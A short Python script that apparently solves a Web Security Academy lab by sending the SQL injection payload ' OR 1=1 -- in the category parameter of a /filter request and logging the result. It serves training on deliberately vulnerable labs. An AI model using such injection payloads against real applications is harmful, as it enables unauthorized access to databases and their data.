from web_security_academy.core.logger import logger
from urllib.parse import urlencode


def solve_lab(session):
    params = {"category": "' OR 1=1 --"}
    logger.info(
        f'Performing SQL injection attack by visiting "/filter?{urlencode(params)}"'
    )
    session.get_path("/filter", params=params)
    logger.success("SQL injection attack performed.")
